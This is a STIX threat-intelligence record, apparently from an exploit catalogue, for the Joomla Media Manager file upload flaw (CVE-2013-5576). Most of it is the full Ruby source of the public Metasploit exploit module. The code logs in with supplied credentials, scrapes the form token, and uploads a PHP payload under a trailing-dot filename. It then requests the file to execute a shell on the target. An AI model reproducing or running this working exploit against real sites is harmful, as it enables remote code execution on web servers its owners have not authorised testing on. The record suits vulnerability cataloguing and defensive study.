{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5dd72508-b558-41ef-8ffd-5c2a70fd5424",
    "created": "2024-08-14T17:13:59.980611Z",
    "modified": "2024-08-14T17:13:59.980615Z",
    "name": "\"Joomla Media Manager File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability found in Joomla 2.5.x up to 2.5.13, as well as 3.x up to 3.1.4 versions. The vulnerability exists in the Media Manager component which comes by default in Joomla, allowing arbitrary file uploads, and results in arbitrary code execution. The module has been tested successfully on Joomla 2.5.13 and 3.1.4 on Ubuntu 10.04. Note: If public access isn't allowed to the Media Manager, you will need to supply a valid username and password (Editor role or higher) in order to work properly.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/joomla_media_upload_exec.rb",
            "external_id": "joomla_media_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5576"
        },
        {
            "source_name": "reference",
            "url": "http://developer.joomla.org/security/news/563-20130801-core-unauthorised-uploads"
        },
        {
            "source_name": "reference",
            "url": "http://www.cso.com.au/article/523528/joomla_patches_file_manager_vulnerability_responsible_hijacked_websites/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/joomla/joomla-cms/commit/fa5645208eefd70f521cd2e4d53d5378622133d8"
        },
        {
            "source_name": "reference",
            "url": "http://niiconsulting.com/checkmate/2013/08/critical-joomla-file-upload-vulnerability/"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/08/15/time-to-patch-joomla"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Joomla Media Manager File Upload Vulnerability\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Joomla 2.5.x up to 2.5.13, as well as\n        3.x up to 3.1.4 versions. The vulnerability exists in the Media Manager component,\n        which comes by default in Joomla, allowing arbitrary file uploads, and results in\n        arbitrary code execution. The module has been tested successfully on Joomla 2.5.13\n        and 3.1.4 on Ubuntu 10.04. Note: If public access isn't allowed to the Media\n        Manager, you will need to supply a valid username and password (Editor role or\n        higher) in order to work properly.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jens Hinrichsen', # Vulnerability discovery according to the OSVDB\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-5576' ],\n          [ 'OSVDB', '95933' ],\n          [ 'URL', 'http://developer.joomla.org/security/news/563-20130801-core-unauthorised-uploads' ],\n          [ 'URL', 'http://www.cso.com.au/article/523528/joomla_patches_file_manager_vulnerability_responsible_hijacked_websites/' ],\n          [ 'URL', 'https://github.com/joomla/joomla-cms/commit/fa5645208eefd70f521cd2e4d53d5378622133d8' ],\n          [ 'URL', 'http://niiconsulting.com/checkmate/2013/08/critical-joomla-file-upload-vulnerability/' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/08/15/time-to-patch-joomla' ]\n        ],\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          # Arbitrary big number. The payload gets sent as POST data, so\n          # really it's unlimited\n          'Space'       => 262144, # 256k\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Joomla 2.5.x <=2.5.13 / Joomla 3.x <=3.1.4', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-08-01',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to Joomla', '/joomla']),\n          OptString.new('USERNAME', [true, 'User to login with', '']),\n          OptString.new('PASSWORD', [true, 'Password to login with', '']),\n        ])\n\n  end\n\n  def check\n    res = get_upload_form\n\n    if res and (res.code == 200 or res.code == 302)\n      if res.body =~ /You are not authorised to view this resource/\n        vprint_status(\"Joomla Media Manager Found but authentication required\")\n        return Exploit::CheckCode::Detected\n      elsif res.body =~ /<form action=\"(.*)\" id=\"uploadForm\"/\n        vprint_status(\"Joomla Media Manager Found and authentication isn't required\")\n        return Exploit::CheckCode::Detected\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def upload(upload_uri)\n    begin\n      u = URI(upload_uri)\n    rescue ::URI::InvalidURIError\n      fail_with(Failure::Unknown, \"Unable to get the upload_uri correctly\")\n    end\n\n    data = Rex::MIME::Message.new\n    data.add_part(payload.encoded, \"application/x-php\", nil, \"form-data; name=\\\"Filedata[]\\\"; filename=\\\"#{@upload_name}.\\\"\")\n    post_data = data.to_s\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => \"#{u.path}?#{u.query}\",\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'cookie'   => @cookies,\n      'vars_get' => {\n        'asset'  => 'com_content',\n        'author' => '',\n        'format' => '',\n        'view'   => 'images',\n        'folder' => ''\n      },\n      'data'     => post_data\n    })\n\n    return res\n\n  end\n\n  def get_upload_form\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, \"index.php\"),\n      'cookie'   => @cookies,\n      'encode_params' => false,\n      'vars_get' => {\n        'option' => 'com_media',\n        'view'   => 'images',\n        'e_name' => 'jform_articletext',\n        'asset'  =>  'com_content',\n        'author' => ''\n      }\n    })\n\n    return res\n  end\n\n  def get_login_form\n\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, \"index.php\", \"component\", \"users\", \"/\"),\n      'cookie'   => @cookies,\n      'vars_get' => {\n        'view' => 'login'\n      }\n    })\n\n    return res\n\n  end\n\n  def login\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, \"index.php\", \"component\", \"users\", \"/\"),\n      'cookie'   => @cookies,\n      'vars_get' => {\n        'task' => 'user.login'\n      },\n      'vars_post' => {\n        'username' => @username,\n        'password' => @password\n        }.merge(@login_options)\n      })\n\n    return res\n  end\n\n  def parse_login_options(html)\n    html.scan(/<input type=\"hidden\" name=\"(.*)\" value=\"(.*)\" \\/>/) {|option|\n      @login_options[option[0]] = option[1] if option[1] == \"1\" # Searching for the Token Parameter, which always has value \"1\"\n    }\n  end\n\n  def exploit\n    @login_options = {}\n    @cookies = \"\"\n    @upload_name = \"#{rand_text_alpha(rand(5) + 3)}.php\"\n    @username = datastore['USERNAME']\n    @password = datastore['PASSWORD']\n\n    print_status(\"Checking Access to Media Component...\")\n    res = get_upload_form\n\n    if res and (res.code == 200 or res.code == 302) and !res.get_cookies.empty? and res.body =~ /You are not authorised to view this resource/\n      print_status(\"Authentication required... Proceeding...\")\n\n      if @username.empty? or @password.empty?\n        fail_with(Failure::BadConfig, \"#{peer} - Authentication is required to access the Media Manager Component, please provide credentials\")\n      end\n      @cookies = res.get_cookies.sub(/;$/, \"\")\n\n      print_status(\"Accessing the Login Form...\")\n      res = get_login_form\n      if res.nil? or (res.code != 200 and res.code != 302) or res.body !~ /login/\n        fail_with(Failure::Unknown, \"#{peer} - Unable to Access the Login Form\")\n      end\n      parse_login_options(res.body)\n\n      res = login\n      if not res or res.code != 303\n        fail_with(Failure::NoAccess, \"#{peer} - Unable to Authenticate\")\n      end\n    elsif res and (res.code == 200 or res.code == 302) and !res.get_cookies.empty? and res.body =~ /<form action=\"(.*)\" id=\"uploadForm\"/\n      print_status(\"Authentication isn't required.... Proceeding...\")\n      @cookies = res.get_cookies.sub(/;$/, \"\")\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Failed to Access the Media Manager Component\")\n    end\n\n    print_status(\"Accessing the Upload Form...\")\n    res = get_upload_form\n\n    if res and (res.code == 200 or res.code == 302) and res.body =~ /<form action=\"(.*)\" id=\"uploadForm\"/\n      upload_uri = Rex::Text.html_decode($1)\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to Access the Upload Form\")\n    end\n\n    print_status(\"Uploading shell...\")\n\n    res = upload(upload_uri)\n\n    if res.nil? or res.code != 200\n      fail_with(Failure::Unknown, \"#{peer} - Upload failed\")\n    end\n\n    register_files_for_cleanup(\"#{@upload_name}.\")\n    print_status(\"Executing shell...\")\n    send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, \"images\", @upload_name),\n    })\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-08-01",
    "x_mitre_platforms": [
        "['php']"
    ]
}